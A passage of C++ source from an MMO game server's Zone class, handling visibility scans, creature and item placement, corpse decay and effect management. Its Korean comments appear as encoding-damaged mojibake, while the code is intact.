// Detect ±âŽ »ý±â°³ª ŸøŸîú °æ¿ì.
// ºžŽ Creature  Creature °¡ »è ³ž®
// Ÿ¿ìºº ¿ë
//////////////////////////////////////////////////////////////////////////////
/*void Zone::updateDetectScan(Creature* pCreature)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	EffectGnomesWhisper* pEffectGnomesWhisper = NULL;
	if ( pCreature->isFlag( Effect::EFFECT_CLASS_GNOMES_WHISPER ) )
	{
		pEffectGnomesWhisper = dynamic_cast<EffectGnomesWhisper*>(pCreature->findEffect(Effect::EFFECT_CLASS_GNOMES_WHISPER));
	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			if ( pCreature->getVisionState(ix,iy) == OUT_OF_SIGHT ) continue;

			if (pCreature->isOusters())
			{
				const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
				list<Object*>::const_iterator itr = objectList.begin();

				for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
				{
					if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pPC = dynamic_cast<Creature*>(*itr);
						Assert(pPC != NULL);

						// ±â  °æ¿ì ë°ú
						if ( pCreature == pPC 
							|| pPC->isFlag(Effect::EFFECT_CLASS_GHOST)) continue;

						if ( pPC->isSlayer() )
						{
							if ( pPC->isFlag( Effect::EFFECT_CLASS_SNIPING_MODE ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
									
									GCAddSlayer gcAddSlayer;
									makeGCAddSlayer(&gcAddSlayer, pSlayer);
									pPlayer->sendPacket(&gcAddSlayer);
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}
						}
						else if ( pPC->isVampire() )
						{
							if ( pPC->isFlag( Effect::EFFECT_CLASS_INVISIBILITY ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									Vampire* pVampire = dynamic_cast<Vampire*>(pPC);
									GCAddVampire gcAddVampire;

									makeGCAddVampire(&gcAddVampire, pVampire);
									pPlayer->sendPacket(&gcAddVampire);
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}

							if ( pPC->isFlag( Effect::EFFECT_CLASS_HIDE ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									GCAddBurrowingCreature gcABC;
									gcABC.setObjectID(pPC->getObjectID());
									gcABC.setName(pPC->getName());
									gcABC.setX(ix);
									gcABC.setY(iy);
									pPlayer->sendPacket(&gcABC);
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}
						}
						else if ( pPC->isMonster() )
						{
							if ( pPC->isFlag( Effect::EFFECT_CLASS_INVISIBILITY ) || pPC->isFlag( Effect::EFFECT_CLASS_HIDE ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									Monster* pMonster= dynamic_cast<Monster*>(pPC);

									Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pCreature );

									if (pAddMonsterPacket!=NULL)
									{
										pPlayer->sendPacket(pAddMonsterPacket);

										delete pAddMonsterPacket;
									}
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}
						}
					}
				}
			}
		}
	}

	__END_CATCH
}*/

//--------------------------------------------------------------------------------
// update mine scan
// detect mineµî ¿°ú°¡ »ç¶óø °æ¿ì..ºžŽ mine Ÿºž° µ °æ¿ì
// pCreature¿¡° GCDeleteObjectž ºž³»Ž.
//--------------------------------------------------------------------------------
void Zone::updateMineScan(Creature* pCreature)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			if ( pCreature->getVisionState(ix,iy) == OUT_OF_SIGHT ) continue;

			// »ç pCreatureŽ Žç¿¬÷ slayerŽ.(updateMineScan¹·..)
			if (pCreature->isSlayer())
			{
				Item* pItem = m_pTiles[ix][iy].getItem();
				if (pItem)
				{
					if (pItem->getItemClass() == Item::ITEM_CLASS_MINE && pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
					{
						if (pCreature->isFlag(Effect::EFFECT_CLASS_REVEALER) )
						{
							
							GCAddInstalledMineToZone gcAddMine;
							
							makeGCAddInstalledMineToZone(&gcAddMine, pItem, ix, iy);

							pPlayer->sendPacket(&gcAddMine);
						} else {
							GCDeleteObject gcDO;
							gcDO.setObjectID(pItem->getObjectID());
							pPlayer->sendPacket(&gcDO);
						}
					}
				}
			}// darkness
		}
	}

	__END_CATCH
}


void Zone::updateViewAbility(Creature* pCreature, const ViewAbility& prevView)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	ViewAbility* pCurView = pCreature->getViewAbility();

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			if ( pCreature->getVisionState(ix,iy) == OUT_OF_SIGHT ) continue;

			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			for (list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
			{
				if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
				{
					Creature* pTarget = dynamic_cast<Creature*>(*itr);
					Assert(pTarget != NULL);
					
					// ±â  °æ¿ì ë°ú
					if ( pCreature == pTarget ) continue;

					bool prevCanSee = prevView.canSee(pTarget);
					bool curCanSee = pCurView->canSee(pTarget);

					// º ö Ÿø° µ °æ¿ì
					if ( prevCanSee && !curCanSee )
					{
						GCDeleteObject gcDO;
						gcDO.setObjectID( pTarget->getObjectID() );
						pPlayer->sendPacket(&gcDO);
					}
					// º ö ° µ °æ¿ì
					else if ( curCanSee && !prevCanSee )
					{
						Packet* pAddPacket = pTarget->getAddPacket();
						pPlayer->sendPacket(pAddPacket);
					}
				}
			}
		}
	}

	__END_CATCH
}

void Zone::updateViewable(Creature* pCreature, const Viewable& prevViewable)
{
	__BEGIN_TRY

	Assert(pCreature != NULL);

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();

	Viewable* pCurViewable = pCreature->getViewable();

	GCDeleteObject gcDO;
	gcDO.setObjectID( pCreature->getObjectID() );

	Packet* pAddPacket = pCreature->getAddPacket();
	Assert( pAddPacket != NULL );

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			for (list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
			{
				if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
				{
					Creature* pViewer = dynamic_cast<Creature*>(*itr);
					Assert(pViewer != NULL);

					if ( pViewer->getVisionState(cx,cy) == OUT_OF_SIGHT ) continue;

					// ±â  °æ¿ì ë°ú
					if ( pCreature == pViewer ) continue;

					if ( pViewer->isPC() )
					{
						Player* pPlayer = pViewer->getPlayer();

						if ( pPlayer == NULL ) continue;

						bool prevCanSee = pViewer->getViewAbility()->canSee( &prevViewable );
						bool curCanSee = pViewer->getViewAbility()->canSee( pCurViewable );

						// º ö Ÿø° µ °æ¿ì
						if ( prevCanSee && !curCanSee )
						{
							pPlayer->sendPacket( &gcDO );
						}
						// º ö ° µ °æ¿ì
						else if ( curCanSee && !prevCanSee )
						{
							pPlayer->sendPacket( pAddPacket );
						}
					}
				}
			}
		}
	}

	__END_CATCH
}

//--------------------------------------------------------------------------------
// add Creature
// ©ž®³°¡ ž¿¡ · µéŸî°¥ ¶§, ©ž®³ º¯ PCµé¿¡° »õ ©ž®³ âö» Ÿ·Ž.
//--------------------------------------------------------------------------------
void Zone::addCreature(Creature* pCreature, ZoneCoord_t cx, ZoneCoord_t cy, Dir_t dir)
	throw(EmptyTileNotExistException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_ADD_CREATURE")

	TPOINT pt = findSuitablePosition(this, cx, cy, pCreature->getMoveMode());

	// £º °æ¿ì ©
	if (pt.x != -1) 
	{
		//--------------------------------------------------------------------------------
		// OID ž Žç¹ŽŽ.
		//--------------------------------------------------------------------------------
		m_ObjectRegistry.registerObject(pCreature);

		//--------------------------------------------------------------------------------
		// ûý ž» £Ÿžžé, ©ž®³ž ©ž®³žŽú¿ ž¿¡ °¢°¢ ýŸî³ŽŽ.
		// Monster  °æ¿ì, MonsterManager¿¡ °¡žç, NPC  °æ¿ì, NPCManager ¿¡ °¡Ž.
		//--------------------------------------------------------------------------------
		if (pCreature->isMonster())
		{

//#ifdef __XMAS_EVENT_CODE__
			Monster* pMonster = dynamic_cast<Monster*>(pCreature);

			if ( isDynamicZone() )
			{
				pMonster->setScanEnemy(true);
			}

			m_pMonsterManager->addCreature(pCreature);
/*			if ( pCreature->getClanType() != CLAN_VAMPIRE_MONSTER )
				cout << pCreature->toString() << " regens at " << pt.x << " , " << pt.y << endl;*/

			switch ( pMonster->getMonsterType() )
			{
				case 717:
				case 721:
				case 723:
				case 724:
				case 725:
				case 808:
					{
						map<ObjectID_t, Creature*>::iterator itr = m_pPCManager->getCreatures().begin();
						map<ObjectID_t, Creature*>::iterator endItr = m_pPCManager->getCreatures().end();

						for ( ; itr != endItr ; ++itr )
						{
							pMonster->addPotentialEnemy( itr->second );
						}
						break;
					}
				default:
					break;
			}

			/*
			switch (pMonster->getMonsterType())
			{
				case 358:
				case 359:
				case 360:
				case 361:
					m_pEventMonsterManager->addCreature(pCreature);
					break;

				default:
					m_pMonsterManager->addCreature(pCreature);
					break;
			}
			*/
//#else
//			m_pMonsterManager->addCreature(pCreature);
/*
#endif
*/
		}
		else if (pCreature->isNPC())
		{
			m_pNPCManager->addCreature(pCreature);
		}

		//cout << "ž¿¡ žóº °¡±â" << endl;
	   	m_pTiles[pt.x][pt.y].addCreature(pCreature, false);
	
		//--------------------------------------------------------------------------------
		// ©ž®³ ¥ž öŽ.
		//--------------------------------------------------------------------------------
		pCreature->setXYDir(pt.x, pt.y, dir);
		pCreature->setZone(this);
		
		//scanPC(pCreature);

		//--------------------------------------------------------------------------------
		// º¯ PCµé¿¡° Ÿž± GCAddNPC or GCAddMonster ¶» »ýºŽ.
		//--------------------------------------------------------------------------------
		//cout << "º¯ PCµé¿¡° Ÿž± ¶ žžµé±â" << endl;
		Creature::CreatureClass CClass = pCreature->getCreatureClass();

		if (CClass == Creature::CREATURE_CLASS_NPC)
		{
			NPC* pNPC = dynamic_cast<NPC*>(pCreature);
			GCAddNPC gcAddNPC;
			makeGCAddNPC(&gcAddNPC, pNPC);
			broadcastPacket(pt.x, pt.y, &gcAddNPC);
		}
		else if (CClass == Creature::CREATURE_CLASS_MONSTER)
		{
			//cout << "žóº¿ë ¶ žžµé±â" << endl;
			Monster* pMonster = dynamic_cast<Monster*>(pCreature);

			// zone¿¡ ³ µéŸî°¥¶§µµ ¿©·¯°¡ö »ó°¡ Ž.. by sigi
			Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, NULL );

			if (pAddMonsterPacket!=NULL)
			{
				broadcastPacket( cx, cy, pAddMonsterPacket, pMonster );
/*				ZoneCoord_t ix = 0;
				ZoneCoord_t iy = 0;
				ZoneCoord_t endx = 0;
				ZoneCoord_t endy = 0;


				//////////////////////////////////////////////////////////////////////////////
				// ·ç º¯ö ±â­..
				//////////////////////////////////////////////////////////////////////////////
				int Range = 0;
				endx = min(m_Width - 1, cx + maxViewportWidth + 1 + Range);
				endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1 + Range);

				for (ix =  max(0, cx - maxViewportWidth - 1 - Range); ix <= endx ; ix++) 
				{
					for (iy = max(0, cy - maxViewportUpperHeight - 1 -  Range); iy <= endy ; iy++) 
					{
						// ž¿¡ ©ž®³°¡ Ž °æ¿ì¿¡žž
						if (m_pTiles[ix][iy].hasCreature()) 
						{
							const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
							list<Object*>::const_iterator itr = objectList.begin();

							for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
							{
								Creature* pOtherCreature = dynamic_cast<Creature*>(*itr);
								Assert(pOtherCreature != NULL);

								if (pOtherCreature->isPC()) 
								{
									if ( canSee( pOtherCreature, pMonster ) )
									{
										pOtherCreature->getPlayer()->sendPacket(pAddMonsterPacket);
									}
								} // if

							} // for
						}//if
					}//for
				}//for
*/
				delete pAddMonsterPacket;
			}
			
			NotifyAddMonster(pMonster);

			// by sigi. 2002.9.6
			// ÷»» ë­ ³ªž³ªŽ žð» ºž¿©Ž.
			// ·¡±ž ²šŽ.
			if (pMonster->isFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL))
			{
				pMonster->removeFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL);
			}
		}
		else
		{
			throw Error("invalid creature type");
		}
	} 
	else 
	{
		throw EmptyTileNotExistException("too many creature in this zone.. or too unlucky");
	}

	__END_PROFILE_ZONE("Z_ADD_CREATURE")

	__END_CATCH
}


//--------------------------------------------------------------------------------
// ¯ §¡¿¡ Ÿ» ¶³Ÿî¶ž°Ž.
// Zone ::addItem()
// 7x7 ¿µ¿ª» °»ç­ ºó­ žçžé ¶³Ÿî¶ž°Ž. ¹®Ž çöŸøŽ °æ¿ì ºó­ 
// žçö Ÿ» °æ¿ìµ¥.. ¶§ ¿¹¿ž Žøüž·á ± ³ž®ž »ó§¿¡° ž±âžé
// µ µí...
//--------------------------------------------------------------------------------
TPOINT Zone::addItem(Item* pItem, ZoneCoord_t cx, ZoneCoord_t cy, bool bAllowCreature, Turn_t decayTurn, ObjectID_t DropPetOID)
	throw(EmptyTileNotExistException, Error)
{
	__BEGIN_TRY

	__BEGIN_DEBUG

	TPOINT          pt;

	__BEGIN_PROFILE_ZONE("Z_ADD_ITEM")

	Item::ItemClass IClass = pItem->getItemClass();

	bool bAllowSafeZone = true;

	if ( isRelicItem( IClass ) || pItem->isFlagItem() )
		bAllowSafeZone = false;

	bool bDropForce = false;
	if ( pItem->isFlag( Effect::EFFECT_CLASS_DROP_FORCE ) )
	{
		pItem->removeFlag( Effect::EFFECT_CLASS_DROP_FORCE );
		bDropForce = true;
	}
	pt     = findSuitablePositionForItem(this, cx, cy, bAllowCreature, bAllowSafeZone, bDropForce);
	
	// ³õ» §¡ž £Ÿ³ °æ¿ì
	if (pt.x != -1) 
	{ 
		m_pTiles[pt.x][pt.y].addItem(pItem);
		addToItemList(pItem);
			   	
		if (IClass == Item::ITEM_CLASS_CORPSE) 
		{
			ItemType_t itemType = pItem->getItemType();

			Turn_t DelayTime = 0;

			bool isShrine = false;
			bool isFlag = false;

			if (itemType == SLAYER_CORPSE)
			{
				SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
				pSlayerCorpse->setXY(pt.x, pt.y);

				GCAddSlayerCorpse gcAddSlayerCorpse;
				makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
				broadcastPacket(pt.x, pt.y, &gcAddSlayerCorpse);

				// ž¶º ·¹Ÿî¿¡­Ž °¡ »¡ž® »ç¶óøŽ.
				if (isMasterLair() || isMikllizzLair()) DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
				 				else DelayTime = 6000;
			}
			else if (itemType == VAMPIRE_CORPSE)
			{
				VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
				pVampireCorpse->setXY(pt.x, pt.y);

				GCAddVampireCorpse gcAddVampireCorpse;
				makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
				broadcastPacket(pt.x, pt.y, &gcAddVampireCorpse);

				// ž¶º ·¹Ÿî¿¡­Ž °¡ »¡ž® »ç¶óøŽ.
				if (isMasterLair() || isMikllizzLair()) DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
				 				else DelayTime = 6000;
			}
			else if (itemType == OUSTERS_CORPSE)
			{
				OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
				pOustersCorpse->setXY(pt.x, pt.y);

				GCAddOustersCorpse gcAddOustersCorpse;
				makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
				broadcastPacket(pt.x, pt.y, &gcAddOustersCorpse);

				// ž¶º ·¹Ÿî¿¡­Ž °¡ »¡ž® »ç¶óøŽ.
				if (isMasterLair() || isMikllizzLair()) DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
				 				else DelayTime = 6000;
			}
			else if (itemType == NPC_CORPSE)
			{
				Assert(false);
			}
			else if (itemType == MONSTER_CORPSE)
			{
				MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
				GCAddMonsterCorpse gcAddMonsterCorpse;
				makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, pt.x, pt.y);
				broadcastPacket(pt.x, pt.y, &gcAddMonsterCorpse);

				isFlag = g_pFlagManager->isFlagPole( pMonsterCorpse );

				// ž¶º ·¹Ÿî¿¡­Ž °¡ »¡ž® »ç¶óøŽ.
				if (isMasterLair() || isMikllizzLair()) 
				{
					MonsterType_t mt = pMonsterCorpse->getMonsterType();
					const MonsterInfo* pMonsterInfo = g_pMonsterInfoManager->getMonsterInfo( mt );
					Assert(pMonsterInfo!=NULL);

					// ž¶º  °æ¿ìŽ Žõ »¡ž® »ç¶óøŽ.
					if (pMonsterInfo->isMaster())
					{
						// Ÿ ŸøŸî­ Žõ »¡ž® »ç¶óö±â ¶§¹®Ž. * 10
						DelayTime = DELAY_MASTER_LAIR_DECAY_MASTER_CORPSE * 10;
					}
					else
					{
						DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
					}
				}
				else DelayTime = 600;

				sendRelicEffect( pMonsterCorpse, this, pt.x, pt.y );

				// ° Ž. -_-;
				// ¿ø·¡ item¿¡Ž zone¥°¡ µéŸî°¡ö ŸŽµ¥
				// ¯º°÷ º¹°ºž°üŽë¿¡Ž ¿ä±â ¶§¹®¿¡..
				pMonsterCorpse->setX( pt.x );
				pMonsterCorpse->setY( pt.y );
				pMonsterCorpse->setZone( this );

				isShrine = pMonsterCorpse->isShrine() && !g_pFlagManager->isFlagPole( pMonsterCorpse );
				
				// Shrine °æ¿ì ¹Žž¿¡ ºž¿©Ž.
				if (isShrine)
				{
					NPCInfo* pNPCInfo = new NPCInfo();
					pNPCInfo->setName( pMonsterCorpse->getName() );
					pNPCInfo->setNPCID( pMonsterCorpse->getMonsterType() );
					pNPCInfo->setX( pt.x );
					pNPCInfo->setY( pt.y );

					addNPCInfo( pNPCInfo );
				}
			}
			else
			{
				Assert(false);
			}

			// Ÿ µéŸî°¡ö Ÿº ¶óžé µô·¹ °£» Ž.
			Corpse* pCorpse = dynamic_cast<Corpse*>(pItem);
			if (pCorpse->getTreasureCount() == 0)
			{
				DelayTime = DelayTime/10;
			}
			// Relic °æ¿ì¿¡Ž °£ ö¿¬¿¡ µû¶ó Ÿ »ç¶óöö ŸŽŽ.
			if (!isShrine && !isFlag
				&& !pCorpse->isFlag(Effect::EFFECT_CLASS_SLAYER_RELIC_TABLE)
			    && !pCorpse->isFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC_TABLE)
			    && !pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_GUARD)
			    && !pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_HOLY) 
				&& pCorpse->getTreasureCount() < 200 )
			{
				// °­· ö delay
				if (decayTurn!=0) DelayTime = decayTurn;

				// ¹Ž¿¡ ¶³ŸîöŽ Ÿº  °£ ö³ªžé »ç¶óö° µŽ.
				EffectDecayCorpse* pEffectDecayCorpse = new EffectDecayCorpse(this, pt.x, pt.y, (Corpse*)pItem, DelayTime);
//				pEffectDecayCorpse->setNextTime(999999);
				m_ObjectRegistry.registerObject(pEffectDecayCorpse);
				addEffect(pEffectDecayCorpse);
			}
			else
			{
				// ±êŽë °æ¿ì¿£ blockµžé ŸµŽ.
				if ( !isFlag )
				{
					// º¹° ºž°üŽëŽ Ÿ()öžž
					// Block µŸîŸ Ž.
					Tile& rTile = getTile(pt.x, pt.y);
					
					rTile.setBlocked( Creature::MOVE_MODE_WALKING );
					rTile.setBlocked( Creature::MOVE_MODE_BURROWING );

					// º¹° ºž°üŽë ºžž úåŽ.
					m_RelicTableOID = pCorpse->getObjectID();
					m_RelicTableX = pt.x;
					m_RelicTableY = pt.y;
					
					//cout << "Relic °æ¿ì¿¡Ž °¡ »ç¶óöö ŸŽŽ" << endl;
				}
			}
		} 
		else
		{
			GCDropItemToZone gcDropItemToZone;
			makeGCDropItemToZone(&gcDropItemToZone, pItem, pt.x, pt.y);
			gcDropItemToZone.setDropPetOID( DropPetOID );

			broadcastPacket(pt.x, pt.y, &gcDropItemToZone);

			// žð»ç¬º °£ ö³ªµµ »ç¶óöö ŸŽŽ.
			if (IClass == Item::ITEM_CLASS_MOTORCYCLE)
			{
				// transport °æ¿ìž Žëºñ­ ©ŸŽ.
				MotorcycleBox* pMotorcycleBox = g_pParkingCenter->getMotorcycleBox( pItem->getItemID() );

				if (pMotorcycleBox!=NULL)
				{
					Motorcycle* pMotorcycle = pMotorcycleBox->getMotorcycle();
					Assert(pMotorcycle!=NULL);

					// Ÿ úå û­. by sigi. 2002.5.15
					char pField[80];
					sprintf(pField, "OwnerID='', Storage=%d, StorageID=%u, X=%d, Y=%d",
									STORAGE_ZONE, getZoneID(), (int)pt.x, (int)pt.y);

					pMotorcycle->tinysave( pField );

					pMotorcycleBox->setZone( this );
					pMotorcycleBox->setX( pt.x );
					pMotorcycleBox->setY( pt.y );

					pMotorcycleBox->setTransport( false );
				}
			}
			else if (isRelicItem( IClass ))
			{
				// relicº »ç¶óöö ŸŽŽ.
				addEffectRelicPosition( pItem, getZoneID(), pt );
				char pField[80];
				sprintf(pField, "OwnerID='', Storage=%d, StorageID=%u, X=%d, Y=%d", STORAGE_ZONE, getZoneID(), pt.x, pt.y);
				pItem->tinysave(pField);
			}
			else
			{
				// 2002.10.30 å«¢
				// Ÿ »è °£» ö 10º¿¡­ 3ºž· Ž.
				// Turn_t DelayTime = 6000;
				Turn_t DelayTime = 1800;

				// ž¶º ·¹Ÿî¿¡­Ž Ÿ »¡ž® »ç¶óøŽ.
				if (isMasterLair() || isMikllizzLair())
				{
					DelayTime = DELAY_MASTER_LAIR_DECAY_ITEM;
				}

				if ( !pItem->isFlagItem() && IClass != Item::ITEM_CLASS_SWEEPER )
				{
					// °­· ö delay
					if (decayTurn!=0) DelayTime = decayTurn;

					// ¹Ž¿¡ ¶³ŸîöŽ Ÿº  °£ ö³ªžé »ç¶óö° µŽ.
					EffectDecayItem* pEffectDecayItem = new EffectDecayItem(this, pt.x, pt.y, (Item*)pItem, DelayTime);
					pEffectDecayItem->setNextTime(999999);
					m_ObjectRegistry.registerObject(pEffectDecayItem);
					addEffect(pEffectDecayItem);
				}
				else
				{
					char pField[80];
					sprintf(pField, "OwnerID='', Storage=%d, StorageID=%u, X=%d, Y=%d", STORAGE_ZONE, getZoneID(), pt.x, pt.y);
					pItem->tinysave(pField);
				}
			}
		}

		return pt;
	} 
	else 
	{
		TPOINT pt_error;
		pt_error.x = -1;
		pt_error.y = -1;

		return pt_error;
	}

	__END_PROFILE_ZONE("Z_ADD_ITEM")
	return pt;

	__END_DEBUG
	__END_CATCH
}


//--------------------------------------------------------------------------------
// get Item
//--------------------------------------------------------------------------------
Item*
Zone::getItem(ObjectID_t id) const
	throw (Error)
{
    map<ObjectID_t, Item*>::const_iterator iItem = m_Items.find(id);

	if (iItem != m_Items.end())
	{
		return iItem->second;
	}

	return NULL;
}


//--------------------------------------------------------------------------------
//--------------------------------------------------------------------------------
void Zone::addEffect(Effect* pEffect)
	throw(Error)
{
	__BEGIN_TRY

	Assert(pEffect != NULL);

	m_pEffectManager->addEffect(pEffect);

	__END_CATCH
}

void Zone::deleteEffect(ObjectID_t id) 
	throw(Error)
{
	__BEGIN_TRY

	m_pEffectManager->deleteEffect(id);

	__END_CATCH
}

Effect* Zone::findEffect(Effect::EffectClass eid) 
	throw(Error)
{
	__BEGIN_TRY

	return m_pEffectManager->findEffect(eid);

	__END_CATCH
}

//--------------------------------------------------------------------------------
//--------------------------------------------------------------------------------
void Zone::addEffect_LOCKING(Effect* pEffect)
	throw(Error)
{
	__BEGIN_TRY

	Assert(pEffect != NULL);

	__ENTER_CRITICAL_SECTION(m_MutexEffect)

	m_pLockedEffectManager->addEffect(pEffect);

	__LEAVE_CRITICAL_SECTION(m_MutexEffect)

	__END_CATCH
}

void Zone::deleteEffect_LOCKING(ObjectID_t id) 
	throw(Error)
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION(m_MutexEffect)

	m_pLockedEffectManager->deleteEffect(id);

	__LEAVE_CRITICAL_SECTION(m_MutexEffect)

	__END_CATCH
}




//--------------------------------------------------------------------------------
// Delete PC from PC Manager (only do this)
//--------------------------------------------------------------------------------
void Zone::deletePC(Creature* pCreature) 
	throw()//NoSuchElementException, Error)
{
	__BEGIN_TRY

	Assert(pCreature != NULL);
	m_pPCManager->deleteCreature(pCreature->getObjectID());


	__END_CATCH
}

//--------------------------------------------------------------------------------
// Delete Queue PC
//--------------------------------------------------------------------------------
void Zone::deleteQueuePC(Creature* pCreature) 
	throw(NoSuchElementException, Error)
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION(m_Mutex)

	Assert(pCreature != NULL);

	list<Creature*>::iterator itr = find_if (m_PCListQueue.begin(), m_PCListQueue.end(), isSameCreature(pCreature));

	if (itr != m_PCListQueue.end()) 
	{

		m_PCListQueue.erase(itr);

	}

	__LEAVE_CRITICAL_SECTION(m_Mutex)

	__END_CATCH
}

//--------------------------------------------------------------------------------
// Add PC to PC Manager (only do this)
//--------------------------------------------------------------------------------
void Zone::addPC(Creature* pCreature) 
	throw(Error)
{
	__BEGIN_TRY

	Assert(pCreature != NULL);
	m_pPCManager->addCreature(pCreature);

	__END_CATCH
}


//--------------------------------------------------------------------------------
//
//--------------------------------------------------------------------------------
void Zone::deleteCreature(Creature* pCreature, ZoneCoord_t x, ZoneCoord_t y)
	throw(NoSuchElementException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_DELETE_CREATURE")

	try 
	{
		Assert(pCreature->getX() == x && pCreature->getY() == y);

		// ŽçµŽ CreatureManager ¿¡­ ©ž®³ž »èŽ.
		if (pCreature->isPC())
		{
			m_pPCManager->deleteCreature(pCreature->getObjectID());

	
			//  Žë¶óžé PartyInviteInfož »èŽ.
			m_pPartyInviteInfoManager->cancelInvite(pCreature);

			// ¿¡ °¡µŸî ŸúŽžé · ¿¡­ »è Ž.
			uint PartyID = pCreature->getPartyID();
			if (PartyID != 0)
			{
				m_pLocalPartyManager->deletePartyMember(PartyID, pCreature);
			}

			// ®·¹µå ŸúŽžé ®·¹µå °ü· ºžž »èŽ.
			TradeInfo* pInfo = m_pTradeManager->getTradeInfo(pCreature->getName());
			if (pInfo != NULL)
			{
				m_pTradeManager->cancelTrade(pCreature);
			}
		}
		else if (pCreature->isMonster())
		{

//#ifdef __XMAS_EVENT_CODE__
//			Monster* pMonster = dynamic_cast<Monster*>(pCreature);
			m_pMonsterManager->deleteCreature(pCreature->getObjectID());
/*			switch (pMonster->getMonsterType())
			{
				case 358:
				case 359:
				case 360:
				case 361:
					m_pEventMonsterManager->deleteCreature(pCreature->getObjectID());
					break;

				default:
					m_pMonsterManager->deleteCreature(pCreature->getObjectID());
					break;
			}*/
//#else
//			m_pMonsterManager->deleteCreature(pCreature->getObjectID());
/*
#endif
*/
		}
		else if (pCreature->isNPC())
		{
			m_pNPCManager->deleteCreature(pCreature->getObjectID());
		}

		// ž¿¡­ ©ž®³ž »èŽ.
